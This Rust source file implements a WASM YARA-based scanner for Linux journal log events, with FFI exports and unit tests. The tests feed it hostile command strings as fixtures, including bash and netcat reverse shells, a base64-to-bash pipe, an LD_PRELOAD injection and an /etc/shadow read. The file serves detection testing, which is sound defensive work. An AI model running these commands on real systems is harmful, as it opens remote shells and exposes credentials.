use std::alloc::{Layout, alloc, dealloc};
use std::cell::RefCell;
use std::collections::BTreeMap;
use std::collections::HashMap;
use std::ptr::NonNull;

use boreal::compiler::CompilerBuilder;
use boreal::module::{Hash, Math, String_};
use boreal::{MetadataValue, Scanner};
use serde::{Deserialize, Serialize};

/// Maximum payload bytes scanned per log event to keep WASM execution bounded
/// without relying on `std::time::Instant` (which panics on `wasm32-unknown-unknown`).
pub const MAX_SCAN_BYTES: usize = 64 * 1024;
const MAX_ALLOC_BYTES: usize = 16 * 1024 * 1024;

#[derive(Debug, Clone, Deserialize)]
pub struct EventSymbols {
    #[serde(default)]
    pub systemd_unit: String,
    #[serde(default)]
    pub syslog_identifier: String,
    #[serde(default)]
    pub transport: String,
    #[serde(default)]
    pub comm: String,
    #[serde(default)]
    pub exe: String,
    #[serde(default)]
    pub host: String,
    #[serde(default = "default_priority")]
    pub priority: i64,
}

fn default_priority() -> i64 {
    6
}

impl Default for EventSymbols {
    fn default() -> Self {
        Self {
            systemd_unit: String::new(),
            syslog_identifier: String::new(),
            transport: String::new(),
            comm: String::new(),
            exe: String::new(),
            host: String::new(),
            priority: default_priority(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct RuleMatch {
    pub name: String,
    pub namespace: String,
    pub tags: Vec<String>,
    pub metadata: BTreeMap<String, serde_json::Value>,
    pub patterns: Vec<String>,
}

pub struct Engine {
    scanner: Scanner,
}

impl Engine {
    pub fn compile(rules_src: &str) -> Result<Self, String> {
        // Explicitly omit `boreal::module::Time` so `SystemTime::now()` is never
        // invoked on `wasm32-unknown-unknown`.
        let mut compiler = CompilerBuilder::default()
            .add_module(Math)
            .add_module(String_)
            .add_module(Hash)
            .build();

        for name in [
            "systemd_unit",
            "syslog_identifier",
            "transport",
            "comm",
            "exe",
            "host",
        ] {
            if !compiler.define_symbol(name, "") {
                return Err(format!("duplicate external symbol definition `{name}`"));
            }
        }
        if !compiler.define_symbol("priority", default_priority()) {
            return Err("duplicate external symbol definition `priority`".to_owned());
        }

        compiler
            .add_rules_str(rules_src)
            .map_err(|err| format!("failed to compile YARA rules: {err}"))?;

        Ok(Self {
            scanner: compiler.finalize(),
        })
    }

    pub fn scan(&mut self, payload: &[u8], symbols: &EventSymbols) -> Result<Vec<RuleMatch>, String> {
        self.scanner
            .define_symbol("systemd_unit", symbols.systemd_unit.as_str())
            .map_err(|err| format!("failed to set `systemd_unit`: {err}"))?;
        self.scanner
            .define_symbol("syslog_identifier", symbols.syslog_identifier.as_str())
            .map_err(|err| format!("failed to set `syslog_identifier`: {err}"))?;
        self.scanner
            .define_symbol("transport", symbols.transport.as_str())
            .map_err(|err| format!("failed to set `transport`: {err}"))?;
        self.scanner
            .define_symbol("comm", symbols.comm.as_str())
            .map_err(|err| format!("failed to set `comm`: {err}"))?;
        self.scanner
            .define_symbol("exe", symbols.exe.as_str())
            .map_err(|err| format!("failed to set `exe`: {err}"))?;
        self.scanner
            .define_symbol("host", symbols.host.as_str())
            .map_err(|err| format!("failed to set `host`: {err}"))?;
        self.scanner
            .define_symbol("priority", symbols.priority)
            .map_err(|err| format!("failed to set `priority`: {err}"))?;

        let bounded = &payload[..payload.len().min(MAX_SCAN_BYTES)];
        let result = self
            .scanner
            .scan_mem(bounded)
            .map_err(|(err, _partial)| format!("YARA scan failed: {err}"))?;

        let matches = result
            .rules
            .into_iter()
            .filter(|rule| rule.matched)
            .map(|rule| {
                let tags = rule
                    .tags
                    .iter()
                    .map(|tag| self.scanner.get_string_symbol(*tag).to_owned())
                    .collect();

                let mut metadata = BTreeMap::new();
                for meta in rule.metadatas {
                    let key = self.scanner.get_string_symbol(meta.name).to_owned();
                    let value = match meta.value {
                        MetadataValue::Bytes(sym) => serde_json::Value::String(
                            String::from_utf8_lossy(self.scanner.get_bytes_symbol(sym)).into_owned(),
                        ),
                        MetadataValue::Integer(num) => serde_json::Value::from(num),
                        MetadataValue::Boolean(flag) => serde_json::Value::from(flag),
                    };
                    metadata.insert(key, value);
                }

                let patterns = rule
                    .matches
                    .iter()
                    .map(|m| {
                        if m.name.is_empty() {
                            "$".to_owned()
                        } else {
                            format!("${}", m.name)
                        }
                    })
                    .collect();

                RuleMatch {
                    name: rule.name.to_owned(),
                    namespace: rule.namespace.to_owned(),
                    tags,
                    metadata,
                    patterns,
                }
            })
            .collect();

        Ok(matches)
    }
}

struct Registry {
    next_id: u32,
    engines: HashMap<u32, Engine>,
}

impl Registry {
    fn new() -> Self {
        Self {
            next_id: 1,
            engines: HashMap::new(),
        }
    }

    fn insert(&mut self, engine: Engine) -> u32 {
        loop {
            let candidate = self.next_id;
            self.next_id = self.next_id.wrapping_add(1);
            if self.next_id == 0 {
                self.next_id = 1;
            }
            if !self.engines.contains_key(&candidate) {
                self.engines.insert(candidate, engine);
                return candidate;
            }
        }
    }
}

thread_local! {
    static ENGINES: RefCell<Registry> = RefCell::new(Registry::new());
    static LAST_OUTPUT: RefCell<Vec<u8>> = const { RefCell::new(Vec::new()) };
}

fn set_last_output(bytes: Vec<u8>) {
    LAST_OUTPUT.with(|cell| {
        *cell.borrow_mut() = bytes;
    });
}

unsafe fn bytes_from_raw<'a>(ptr: *const u8, len: usize) -> Result<&'a [u8], &'static str> {
    if len == 0 {
        return Ok(&[]);
    }
    if ptr.is_null() {
        return Err("null pointer passed with non-zero length");
    }
    // SAFETY: Caller guarantees `ptr` is valid for `len` bytes within WASM linear memory.
    Ok(unsafe { std::slice::from_raw_parts(ptr, len) })
}

#[unsafe(no_mangle)]
pub extern "C" fn oof_alloc(size: usize) -> *mut u8 {
    if size == 0 {
        return NonNull::<u8>::dangling().as_ptr();
    }
    if size > MAX_ALLOC_BYTES {
        return std::ptr::null_mut();
    }
    let Ok(layout) = Layout::from_size_align(size, 1) else {
        return std::ptr::null_mut();
    };
    // SAFETY: `layout` has non-zero size and alignment 1.
    unsafe { alloc(layout) }
}

#[unsafe(no_mangle)]
pub extern "C" fn oof_dealloc(ptr: *mut u8, size: usize) {
    if size == 0 || size > MAX_ALLOC_BYTES || ptr.is_null() {
        return;
    }
    let Ok(layout) = Layout::from_size_align(size, 1) else {
        return;
    };
    // SAFETY: `ptr` was allocated with `oof_alloc(size)` using alignment 1.
    unsafe { dealloc(ptr, layout) };
}

#[unsafe(no_mangle)]
pub extern "C" fn oof_last_output_ptr() -> *const u8 {
    LAST_OUTPUT.with(|cell| {
        let buf = cell.borrow();
        if buf.is_empty() {
            NonNull::<u8>::dangling().as_ptr()
        } else {
            buf.as_ptr()
        }
    })
}

#[unsafe(no_mangle)]
pub extern "C" fn oof_last_output_len() -> usize {
    LAST_OUTPUT.with(|cell| cell.borrow().len())
}

#[unsafe(no_mangle)]
pub extern "C" fn oof_compile(rules_ptr: *const u8, rules_len: usize) -> u32 {
    if rules_len > MAX_ALLOC_BYTES {
        set_last_output(b"rules source exceeds maximum size".to_vec());
        return 0;
    }
    // SAFETY: FFI caller provides valid WASM linear memory slice `(rules_ptr, rules_len)`.
    let raw = match unsafe { bytes_from_raw(rules_ptr, rules_len) } {
        Ok(slice) => slice,
        Err(msg) => {
            set_last_output(msg.as_bytes().to_vec());
            return 0;
        }
    };
    let rules_src = match std::str::from_utf8(raw) {
        Ok(s) => s,
        Err(err) => {
            set_last_output(format!("YARA rules are not valid UTF-8: {err}").into_bytes());
            return 0;
        }
    };

    match Engine::compile(rules_src) {
        Ok(engine) => {
            set_last_output(Vec::new());
            ENGINES.with(|cell| cell.borrow_mut().insert(engine))
        }
        Err(err) => {
            set_last_output(err.into_bytes());
            0
        }
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn oof_free_scanner(handle: u32) -> u32 {
    if handle == 0 {
        return 0;
    }
    ENGINES.with(|cell| u32::from(cell.borrow_mut().engines.remove(&handle).is_some()))
}

#[unsafe(no_mangle)]
pub extern "C" fn oof_scan(
    handle: u32,
    payload_ptr: *const u8,
    payload_len: usize,
    symbols_json_ptr: *const u8,
    symbols_json_len: usize,
) -> i32 {
    if handle == 0 {
        set_last_output(b"invalid scanner handle 0".to_vec());
        return -1;
    }
    if payload_len > MAX_ALLOC_BYTES || symbols_json_len > MAX_ALLOC_BYTES {
        set_last_output(b"input buffer exceeds maximum size".to_vec());
        return -1;
    }

    // SAFETY: FFI caller provides valid WASM linear memory slices for payload and symbols JSON.
    let payload = match unsafe { bytes_from_raw(payload_ptr, payload_len) } {
        Ok(slice) => slice,
        Err(msg) => {
            set_last_output(msg.as_bytes().to_vec());
            return -1;
        }
    };
    // SAFETY: FFI caller provides valid WASM linear memory slice for symbols JSON.
    let symbols_bytes = match unsafe { bytes_from_raw(symbols_json_ptr, symbols_json_len) } {
        Ok(slice) => slice,
        Err(msg) => {
            set_last_output(msg.as_bytes().to_vec());
            return -1;
        }
    };

    let symbols: EventSymbols = if symbols_bytes.is_empty() {
        EventSymbols::default()
    } else {
        match serde_json::from_slice(symbols_bytes) {
            Ok(parsed) => parsed,
            Err(err) => {
                set_last_output(format!("invalid symbols JSON: {err}").into_bytes());
                return -1;
            }
        }
    };

    let result = ENGINES.with(|cell| {
        let mut registry = cell.borrow_mut();
        let Some(engine) = registry.engines.get_mut(&handle) else {
            return Err(format!("unknown scanner handle {handle}"));
        };
        engine.scan(payload, &symbols)
    });

    match result {
        Ok(matches) => match serde_json::to_vec(&matches) {
            Ok(json) => {
                let count = i32::try_from(matches.len()).unwrap_or(i32::MAX);
                set_last_output(json);
                count
            }
            Err(err) => {
                set_last_output(format!("failed to serialize scan matches: {err}").into_bytes());
                -1
            }
        },
        Err(err) => {
            set_last_output(err.into_bytes());
            -1
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const CORE_RULES: &str = include_str!("../../../../rules/yara/linux_journal_core.yar");

    fn read_last_output() -> Vec<u8> {
        let ptr = oof_last_output_ptr();
        let len = oof_last_output_len();
        if len == 0 {
            return Vec::new();
        }
        // SAFETY: `oof_last_output_ptr` / `oof_last_output_len` point to `LAST_OUTPUT` buffer
        // while no other FFI call mutates it.
        unsafe { std::slice::from_raw_parts(ptr, len).to_vec() }
    }

    #[test]
    fn compiles_and_detects_core_journal_rules() {
        let mut engine = Engine::compile(CORE_RULES).expect("core rules should compile");
        let symbols = EventSymbols {
            systemd_unit: "bash.service".to_owned(),
            priority: 4,
            ..EventSymbols::default()
        };

        let benign = engine
            .scan(b"Started Session 42 of User root.", &symbols)
            .expect("benign scan should succeed");
        assert!(benign.is_empty());

        let rev_shell = engine
            .scan(b"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", &symbols)
            .expect("reverse shell scan should succeed");
        assert_eq!(rev_shell.len(), 1);
        assert_eq!(rev_shell[0].name, "Linux_Reverse_Shell_Indicator");
        assert!(rev_shell[0].tags.contains(&"reverse_shell".to_owned()));
        assert_eq!(
            rev_shell[0].metadata.get("severity"),
            Some(&serde_json::json!("CRITICAL"))
        );

        let encoded = engine
            .scan(b"echo aWQ= | base64 -d | bash", &symbols)
            .expect("encoded scan should succeed");
        assert_eq!(encoded.len(), 1);
        assert_eq!(encoded[0].name, "Linux_Encoded_Command_Execution");

        let preload = engine
            .scan(b"LD_PRELOAD=/tmp/libhook.so /usr/bin/id", &symbols)
            .expect("preload scan should succeed");
        assert_eq!(preload.len(), 1);
        assert_eq!(preload[0].name, "Linux_Suspicious_Runtime_Injection");

        let cred = engine
            .scan(b"cat /etc/shadow > /tmp/out", &symbols)
            .expect("credential scan should succeed");
        assert_eq!(cred.len(), 1);
        assert_eq!(cred[0].name, "Linux_Credential_Access_Attempt");
    }

    #[test]
    fn supports_external_symbols_and_binary_or_empty_payloads() {
        let rule = r#"
rule SSHD_Auth_Alert : auth {
    strings:
        $fail = "Failed password"
    condition:
        systemd_unit == "sshd.service" and priority <= 4 and $fail
}
"#;
        let mut engine = Engine::compile(rule).expect("symbol rule should compile");

        let empty = engine
            .scan(b"", &EventSymbols::default())
            .expect("empty payload should scan");
        assert!(empty.is_empty());

        let non_utf8 = engine
            .scan(
                b"\xff\xfe\x00Failed password for root\x80\x81",
                &EventSymbols {
                    systemd_unit: "sshd.service".to_owned(),
                    priority: 3,
                    ..EventSymbols::default()
                },
            )
            .expect("binary payload should scan");
        assert_eq!(non_utf8.len(), 1);
        assert_eq!(non_utf8[0].name, "SSHD_Auth_Alert");

        let wrong_unit = engine
            .scan(
                b"Failed password for root",
                &EventSymbols {
                    systemd_unit: "cron.service".to_owned(),
                    priority: 3,
                    ..EventSymbols::default()
                },
            )
            .expect("different unit should scan");
        assert!(wrong_unit.is_empty());
    }

    #[test]
    fn ffi_lifecycle_handles_errors_zero_alloc_and_double_free() {
        let zero_ptr = oof_alloc(0);
        assert!(!zero_ptr.is_null());
        oof_dealloc(zero_ptr, 0);
        oof_dealloc(std::ptr::null_mut(), 0);

        let bad_rule = b"rule broken { condition: unknown_var }";
        let bad_handle = oof_compile(bad_rule.as_ptr(), bad_rule.len());
        assert_eq!(bad_handle, 0);
        let err_msg = String::from_utf8(read_last_output()).unwrap();
        assert!(err_msg.contains("failed to compile YARA rules"));

        let handle = oof_compile(CORE_RULES.as_ptr(), CORE_RULES.len());
        assert!(handle >= 1);

        let payload = b"nc -e /bin/sh 192.0.2.1 9001";
        let syms = br#"{"systemd_unit":"test.service","priority":2}"#;
        let count = oof_scan(
            handle,
            payload.as_ptr(),
            payload.len(),
            syms.as_ptr(),
            syms.len(),
        );
        assert_eq!(count, 1);
        let matches: Vec<RuleMatch> =
            serde_json::from_slice(&read_last_output()).expect("valid JSON output");
        assert_eq!(matches[0].name, "Linux_Reverse_Shell_Indicator");

        // Invalid symbols JSON should fail explicitly rather than returning 0 silently.
        let bad_syms = b"{not json";
        assert_eq!(
            oof_scan(
                handle,
                payload.as_ptr(),
                payload.len(),
                bad_syms.as_ptr(),
                bad_syms.len()
            ),
            -1
        );

        assert_eq!(oof_free_scanner(handle), 1);
        assert_eq!(oof_free_scanner(handle), 0);
        assert_eq!(oof_scan(handle, payload.as_ptr(), payload.len(), std::ptr::null(), 0), -1);
    }
}
